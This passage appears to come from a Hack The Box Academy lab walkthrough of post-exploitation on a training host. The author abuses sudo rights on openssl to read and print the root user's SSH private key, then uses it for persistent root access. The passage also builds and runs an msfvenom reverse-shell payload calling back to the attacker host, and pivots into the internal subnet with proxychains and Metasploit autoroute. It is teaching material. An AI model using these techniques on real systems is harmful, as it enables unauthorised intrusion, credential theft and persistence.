  (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/openssl
</code></pre>
<p>Running <code>sudo -l</code>, we see that we can run the <code>/usr/bin/openssl</code> command as root without requiring a password. As suspected, there is a <a href="https://gtfobins.github.io/gtfobins/openssl/">GTFOBin</a> for the OpenSSL binary. The entry shows various ways this can be leveraged: to upload and download files, gain a reverse shell, and read and write files. Let&#39;s try this to see if we can grab the SSH private key for the root user. This is ideal over just attempting to read the <code>/etc/shadow</code> file or obtain a reverse shell as the <code>ida_rsa</code> private key file will grant us SSH back into the environment as the root user, which is perfect for setting up our pivots.</p>
<p>The entry states that we can use the binary for privileged file reads as follows:</p>
<p>Post-Exploitation Persistence</p>
<pre><code class="lang-shell-session">LFILE=file_to_read
openssl enc -<span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">$LFILE</span>"</span>
</code></pre>
<p>Let&#39;s give it a try</p>
<p>Post-Exploitation Persistence</p>
<pre><code class="lang-shell-session">srvadm<span class="hljs-meta">@dmz</span><span class="hljs-number">01:</span>~$ LFILE=<span class="hljs-regexp">/root/</span>.ssh/id_rsa
srvadm<span class="hljs-meta">@dmz</span><span class="hljs-number">01:</span>~$ sudo <span class="hljs-regexp">/usr/</span>bin/openssl enc -<span class="hljs-keyword">in</span> $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT<span class="hljs-regexp">/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/</span>kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+<span class="hljs-number">6</span>T0lovwNCiNEz
<span class="hljs-number">7</span>avg7o/<span class="hljs-number">77</span>lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
<span class="hljs-number">9</span>OHCWjY39kBVXObER1uAvXmoJDr74/<span class="hljs-number">9</span>+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/<span class="hljs-number">0</span>ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
<span class="hljs-regexp">/W6B6WR5brkfWIhgzGZa92+IQEZG0AHNJeulA/</span>jQfQYx96v5C/OK0QEjGfPMto1MJke+VM
P8JmcXlQ+RPsiRrlnfhJaaFrQ1us3p2X+m6kktlcC4W67N88iQFxtXhrBnuou5efQ99Ziz
lFCmcWKbHIh35Xw8gie/bIl127GUqeWVLwTraOiRdtD58vuk9JaL8DQojRM+<span class="hljs-number">2</span>r4O6P++<span class="hljs-number">5</span>V
rHwVRKYbT0G5k2cJHtTrYLw6htb+Gw1maijwADMYdF0MbHKcSO8BnFGW2XhfThwlo2N/ZA
VVzmxEdbgL15qCQ6++P<span class="hljs-regexp">/fjrBEF6IuaUoQexUr3AC5cPg01egKR8dt/</span>TvL4Vv9GZMRMyYyI
<span class="hljs-number">7</span>Y0TMjnCz7bRuc7mNX9hQbdqktcNFQAAAAMBAAEAAAGATL2yeec/qSd4qK7D+TSfyf5et6
Xb2x+tBo<span class="hljs-regexp">/RK3vYW8mLwgILodAmWr96249Brdwi9H8VxJDvsGX0/</span>jvxg8KPjqHOTxbwqfJ8
OjeHiTG8YGZXV0sP6FVJcwfoGjeOFnSOsbZjpV3bny3gOicFQMDtikPsX7fewO6JZ22fFv
YSr65BXRSi154Hwl7F5AH1Yb5mhSRgYAAjZm4I5nxT9J2kB61N607X8v93WLy3/AB9zKzl
avML095PJiIsxtpkdO51TXOxGzgbE0TM0FgZzTy3NB8FfeaXOmKUObznvbnGstZVvitNJF
FMFr+APR1Q3WG1LXKA6ohdHhfSwxE4zdq4cIHyo<span class="hljs-regexp">/cYN7baWIlHRx5Ouy/</span>rU+iKp/xlCn9D
hnx8PbhWb5ItpMxLhUNv9mos<span class="hljs-regexp">/I8oqqcFTpZCNjZKZAxIs/</span>RchduAQRpxuGChkNAJPy6nLe
xmCIKZS5euMwXmXhGOXi0r1ZKyYCxj8tSGn8VWZY0Enlj+PIfznMGQXH6ppGxa0x2BAAAA
wESN<span class="hljs-regexp">/RceY7eJ69vvJz+Jjd5ZpOk9aO/</span>VKf+gKJGCqgjyefT9ZTyzkbvJA58b7l2I2nDyd7
N4PaYAIZUuEmdZG715CD9qRi8GLb56P7qxVTvJn0aPM8mpzAH8HR1+mHnv+wZkTD9K9an+
L2qIboIm1eT13jwmxgDzs+rrgklSswhPA+HSbKYTKtXLgvoanNQJ2<span class="hljs-comment">//ME6kD9LFdC97y9n</span>
IuBh4GXEiiWtmYNakti3zccbfpl4AavPeywv4nlGo1vmIL3wAAAMEA7agLGUE5PQl8PDf6
fnlUrw<span class="hljs-regexp">/oqK64A+AQ02zXI4gbZR/</span><span class="hljs-number">9</span>zblXE7zFafMf9tX9OtC9o+O0L1Cy3SFrnTHfPLawSI
nuj+bd44Y4cB5RIANdKBxGRsf8UGvo3wdgi4JIc<span class="hljs-regexp">/QR9QfV59xRMAMtFZtAGZ0hTYE1HL/</span><span class="hljs-number">8</span>
sIl4hRY4JjIw+plv2zLi9DDcwti5tpBN8ohDMA15VkMcOslG69uymfnX+MY8cXjRDo5HHT
M3i4FvLUv9KGiONw94OrEX7JlQA7b5AAAAwQDihl6ELHDORtNFZV0fFoFuUDlGoJW1XR/<span class="hljs-number">2</span>
n8qll95Fc1MZ5D7WGnv7mkP0ureBrD5Q+OIbZOVR+diNv0j+fteqeunU9MS2WMgK/BGtKm
<span class="hljs-number">41</span>qkEUxOSFNgs63tK<span class="hljs-regexp">/jaEzmM0FO87xO1yP8x4prWE1WnXVMlM97p8osRkJJfgIe7/</span>G6kK3
<span class="hljs-number">9</span>PYjklWFDNWcZNlnSiq09ZToRbpONEQsP9rPrVklzHU1Zm5A+nraa1pZDMAk2jGBzKGsa8
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>Note: If you are working from the Pwnbox, be sure to save this private key down to your notes or a local file or you&#39;ll have to re-do all steps to get back to this point should you decide to pause for a while.</p>
<hr>
<h3 id="establishing-persistence">Establishing Persistence</h3>
<p>Success! We can now save the private key to our local system, modify the privileges, and use it to SSH as root and confirm root privileges.</p>
<p>Post-Exploitation Persistence</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ chmod <span class="hljs-number">600</span> dmz01_key 
root@htb[/htb]$ ssh -i dmz01_key root@<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>

Welcome <span class="hljs-built_in">to</span> Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-113</span>-generic x86_64)

 * Documentation:  <span class="hljs-keyword">https</span>://help.ubuntu.com
 * Management:     <span class="hljs-keyword">https</span>://landscape.canonical.com
 * Support:        <span class="hljs-keyword">https</span>://ubuntu.com/advantage

  System information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Tue <span class="hljs-number">21</span> Jun <span class="hljs-number">2022</span> <span class="hljs-number">07</span>:<span class="hljs-number">53</span>:<span class="hljs-number">00</span> PM UTC

  System <span class="hljs-built_in">load</span>:                      <span class="hljs-number">0.04</span>
  Usage <span class="hljs-keyword">of</span> /:                       <span class="hljs-number">97.1</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB
  Memory usage:                     <span class="hljs-number">65</span>%
  Swap usage:                       <span class="hljs-number">0</span>%
  Processes:                        <span class="hljs-number">472</span>
  Users logged <span class="hljs-keyword">in</span>:                  <span class="hljs-number">1</span>
  IPv4 address <span class="hljs-keyword">for</span> br<span class="hljs-number">-65</span>c448355ed2: <span class="hljs-number">172.18</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
  IPv4 address <span class="hljs-keyword">for</span> docker0:         <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
  IPv4 address <span class="hljs-keyword">for</span> ens160:          <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>
  IPv6 address <span class="hljs-keyword">for</span> ens160:          dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:d30d
  IPv4 address <span class="hljs-keyword">for</span> ens192:          <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.120</span>

  =&gt; / is <span class="hljs-keyword">using</span> <span class="hljs-number">97.1</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB

 * Super-optimized <span class="hljs-keyword">for</span> small spaces - <span class="hljs-built_in">read</span> how we shrank <span class="hljs-keyword">the</span> memory
   footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-built_in">to</span> make <span class="hljs-keyword">it</span> <span class="hljs-keyword">the</span> smallest full K8s around.

   <span class="hljs-keyword">https</span>://ubuntu.com/blog/microk8s-memory-optimisation

<span class="hljs-number">97</span> updates can be applied immediately.
<span class="hljs-number">30</span> <span class="hljs-keyword">of</span> these updates are standard security updates.
To see these additional updates run: apt list <span class="hljs-comment">--upgradable</span>


You have mail.
Last login: Tue Jun <span class="hljs-number">21</span> <span class="hljs-number">17</span>:<span class="hljs-number">50</span>:<span class="hljs-number">13</span> <span class="hljs-number">2022</span>
root@dmz01:~<span class="hljs-comment">#</span>
</code></pre>
<p>It worked, and we&#39;re in and now have a &quot;save point&quot; to get back into the internal environment quickly and can use this SSH access to set up port forwards and pivot internally.</p>
<h2 id="internal-information-gathering">Internal Information Gathering</h2>
<hr>
<p>We&#39;ve covered a ton of ground so far:</p>
<ul>
<li>Performed external information gathering</li>
<li>Performed external port and service scanning</li>
<li>Enumerated multiple services for misconfigurations and known vulnerabilities</li>
<li>Enumerated and attacked 12 different web applications, with some resulting in no access, others granting file read or sensitive data access, and a few resulting in remote code execution on the underlying web server</li>
<li>Obtained a hard-fought foothold in the internal network</li>
<li>Performed pillaging and lateral movement to gain access as a more privileged user</li>
<li>Escalated privileges to root on the web server</li>
<li>Established persistence through the use of both a user/password pair and the root account&#39;s private key for fast SSH access back into the environment</li>
</ul>
<hr>
<h3 id="setting-up-pivoting-ssh">Setting Up Pivoting - SSH</h3>
<p>With a copy of the root <code>id_rsa</code> (private key) file, we can use SSH port forwarding along with <a href="https://github.com/haad/proxychains">ProxyChains</a> to start getting a picture of the internal network. To review this technique, check out the <a href="https://academy.hackthebox.com/module/158/section/1426">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a> section of the <code>Pivoting, Tunneling, and Port Forwarding</code> module.</p>
<p>We can use the following command to set up our SSH pivot using dynamic port forwarding: <code>ssh -D 8081 -i dmz01_key root@10.129.x.x</code>. This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside the 172.16.8.0/23 subnet directly from our attack host.</p>
<p>In our first terminal, let&#39;s set up the SSH dynamic port forwarding command first:</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -D <span class="hljs-number">8081</span> -i dmz01_key root@<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>

Welcome <span class="hljs-built_in">to</span> Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-113</span>-generic x86_64)

 * Documentation:  <span class="hljs-keyword">https</span>://help.ubuntu.com
 * Management:     <span class="hljs-keyword">https</span>://landscape.canonical.com
 * Support:        <span class="hljs-keyword">https</span>://ubuntu.com/advantage

  System information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Wed <span class="hljs-number">22</span> Jun <span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> AM UTC

  System <span class="hljs-built_in">load</span>:                      <span class="hljs-number">0.21</span>
  Usage <span class="hljs-keyword">of</span> /:                       <span class="hljs-number">99.9</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB
  Memory usage:                     <span class="hljs-number">65</span>%
  Swap usage:                       <span class="hljs-number">0</span>%
  Processes:                        <span class="hljs-number">458</span>
  Users logged <span class="hljs-keyword">in</span>:                  <span class="hljs-number">2</span>
  IPv4 address <span class="hljs-keyword">for</span> br<span class="hljs-number">-65</span>c448355ed2: <span class="hljs-number">172.18</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
  IPv4 address <span class="hljs-keyword">for</span> docker0:         <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
  IPv4 address <span class="hljs-keyword">for</span> ens160:          <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>
  IPv6 address <span class="hljs-keyword">for</span> ens160:          dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:d30d
  IPv4 address <span class="hljs-keyword">for</span> ens192:          <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.120</span>

  =&gt; / is <span class="hljs-keyword">using</span> <span class="hljs-number">99.9</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB

 * Super-optimized <span class="hljs-keyword">for</span> small spaces - <span class="hljs-built_in">read</span> how we shrank <span class="hljs-keyword">the</span> memory
   footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-built_in">to</span> make <span class="hljs-keyword">it</span> <span class="hljs-keyword">the</span> smallest full K8s around.

   <span class="hljs-keyword">https</span>://ubuntu.com/blog/microk8s-memory-optimisation

<span class="hljs-number">97</span> updates can be applied immediately.
<span class="hljs-number">30</span> <span class="hljs-keyword">of</span> these updates are standard security updates.
To see these additional updates run: apt list <span class="hljs-comment">--upgradable</span>


You have mail.
Last login: Tue Jun <span class="hljs-number">21</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> <span class="hljs-number">2022</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>
root@dmz01:~<span class="hljs-comment">#</span>
</code></pre>
<p>We can confirm that the dynamic port forward is set up using <code>Netstat</code> or running an Nmap scan against our localhost address.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netstat -antp | <span class="hljs-keyword">grep</span> <span class="hljs-number">8081</span>

(Not <span class="hljs-keyword">all</span> processes could <span class="hljs-keyword">be</span> identified, non-owned process info
 will not <span class="hljs-keyword">be</span> shown, you would have <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> root <span class="hljs-keyword">to</span> see it <span class="hljs-keyword">all</span>.)
tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:*               LISTEN      <span class="hljs-number">122808</span>/ssh          
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>
</code></pre>
<p>Next, we need to modify the <code>/etc/proxychains.conf</code> to use the port we specified with our dynamic port forwarding command (8081 here).</p>
<p>Note: If you are working from the Pwnbox, be sure to save this private key down to your notes or a local file or you&#39;ll have to re-do all steps to get back to this point should you decide to pause for a while. Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ grep socks4 /etc/proxychains.conf 

<span class="hljs-meta">#         socks4    192.168.1.49    1080</span>
<span class="hljs-meta">#       proxy types: http, socks4, socks5</span>
socks4     <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">8081</span>
</code></pre>
<p>Next, we can use Nmap with Proxychains to scan the dmz01 host on its&#39; second NIC, with the IP address <code>172.16.8.120</code> to ensure everything is set up correctly.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -<span class="hljs-built_in">sT</span> -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">8080</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">21</span> <span class="hljs-number">21</span>:<span class="hljs-number">15</span> EDT
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">80</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">80</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">22</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">21</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8081</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>:<span class="hljs-number">8080</span>-&lt;&gt;&lt;&gt;-OK
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>13s latency).

PORT     STATE SERVICE
<span class="hljs-number">21</span>/tcp   open  ftp
<span class="hljs-number">22</span>/tcp   open  ssh
<span class="hljs-number">80</span>/tcp   open  http
<span class="hljs-number">8080</span>/tcp open  http-proxy

Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.71</span> seconds
</code></pre>
<hr>
<h3 id="setting-up-pivoting-metasploit">Setting Up Pivoting - Metasploit</h3>
<p>Alternatively, we can set up our pivoting using Metasploit, as covered in the <a href="https://academy.hackthebox.com/module/158/section/1428">Meterpreter Tunneling &amp; Port Forwarding</a> section of the Pivoting module. To achieve this, we can do the following:</p>
<p>First, generate a reverse shell in Elf format using <code>msfvenom</code>.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ msfvenom -p linux/</span>x86<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span> LPORT=<span class="hljs-number">443</span> -f elf &gt; shell.elf

[-] No platform was selected, choosing <span class="hljs-string">Msf:</span>:<span class="hljs-string">Module:</span>:<span class="hljs-string">Platform:</span>:Linux from the payload
[-] No arch selected, selecting <span class="hljs-string">arch:</span> x86 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-string">size:</span> <span class="hljs-number">123</span> bytes
Final size of elf <span class="hljs-string">file:</span> <span class="hljs-number">207</span> bytes
</code></pre>
<p>Next, transfer the host to the target. Since we have SSH, we can upload it to the target using SCP.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp -<span class="hljs-selector-tag">i</span> dmz01_key shell<span class="hljs-selector-class">.elf</span> root@<span class="hljs-number">10.129</span>.<span class="hljs-number">203.111</span>:/tmp

shell<span class="hljs-selector-class">.elf</span>                                                                      <span class="hljs-number">100%</span>  <span class="hljs-number">207</span>     <span class="hljs-number">1.6</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<p>Now, we&#39;ll set up the Metasploit <code>exploit/multi/handler</code>.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; use exploit/multi/handler
[*] Using configured payload generic/shell<span class="hljs-emphasis">_reverse_</span>tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set payload linux/x86/meterpreter/reverse_tcp
payload =&gt; linux/x86/meterpreter/reverse_tcp
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set lhost 10.10.14.15 
lhost =&gt; 10.10.14.15
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; set LPORT 443
LPORT =&gt; 443
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/handler) &gt;&gt; exploit

[*] Started reverse TCP handler on 10.10.14.15:443
</code></pre>
<p>Execute the <code>shell.elf</code> file on the target system:</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># chmod +x shell.elf </span>
root<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/tmp</span><span class="hljs-comment"># ./shell.elf</span>
</code></pre>
<p>If all goes as planned, we&#39;ll catch the Meterpreter shell using the multi/handler, and then we can set up routes.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">msf</span>](<span class="hljs-name">Jobs:0</span> Agents:0) exploit(<span class="hljs-name">multi/handler</span>) &gt;&gt; exploit

[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Started reverse TCP handler on <span class="hljs-number">10.10</span>.14.15:443 
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Sending stage (<span class="hljs-name">989032</span> bytes) to <span class="hljs-number">10.129</span>.203.111
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-name">10.10.14.15:443</span> -&gt; <span class="hljs-number">10.129</span>.203.111:58462 ) at <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">21</span>:28:43 <span class="hljs-number">-0400</span>

(<span class="hljs-name">Meterpreter</span> <span class="hljs-number">1</span>)(<span class="hljs-name">/tmp</span>) &gt; getuid
Server username: root
</code></pre>
<p>Next, we can set up routing using the <code>post/multi/manage/autoroute</code> module.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">(Meterpreter 1)(/tmp) &gt; background
[*] Backgrounding session 1...
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; use post/multi/manage/autoroute 
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/manage/autoroute) &gt;&gt; show options 

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
<span class="hljs-code">                                       fault)</span>
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/manage/autoroute) &gt;&gt; set SESSION 1
SESSION =&gt; 1
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/manage/autoroute) &gt;&gt; set subnet 172.16.8.0
subnet =&gt; 172.16.8.0
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/manage/autoroute) &gt;&gt; run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
</code></pre>
<p>For a refresher, consult the <a href="https://academy.hackthebox.com/module/115/section/1205">Crafting Payloads with MSFvenom</a> section of the <code>Shells &amp; Payloads</code> module and the <a href="https://academy.hackthebox.com/module/39/section/418">Introduction to MSFVEnom</a> section of the <code>Using the Metasploit Framework</code> module.</p>
<hr>
<h3 id="host-discovery-172-16-8-0-23-subnet-metasploit">Host Discovery - 172.16.8.0/23 Subnet - Metasploit</h3>
<p>Once both options are set up, we can begin hunting for live hosts. Using our Meterpreter session, we can use the <code>multi/gather/ping_sweep</code> module to perform a ping sweep of the <code>172.16.8.0/23</code> subnet.</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/manage/autoroute) &gt;&gt; use post/multi/gather/ping_sweep
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/gather/ping_sweep) &gt;&gt; show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/gather/ping_sweep) &gt;&gt; set rhosts 172.16.8.0/23
rhosts =&gt; 172.16.8.0/23
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/gather/ping_sweep) &gt;&gt; set SESSION 1
SESSION =&gt; 1
[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) post(multi/gather/ping_sweep) &gt;&gt; run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+]     172.16.8.3 host found
[+]     172.16.8.20 host found
[+]     172.16.8.50 host found
[+]     172.16.8.120 host found
</code></pre>
<hr>
<h3 id="host-discovery-172-16-8-0-23-subnet-ssh-tunnel">Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel</h3>
<p>Alternatively, we could do a ping sweep or use a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap">static Nmap binary</a> from the dmz01 host.</p>
<p>We get quick results with this Bash one-liner ping sweep:</p>
<p>Internal Information Gathering</p>
<pre><code class="lang-shell-session">root@dmz01:~<span class="hljs-comment"># for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 &amp; done | grep from</span>

<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">128</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">0.472</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.20</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">128</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">0.433</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.120</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">0.031</span> ms
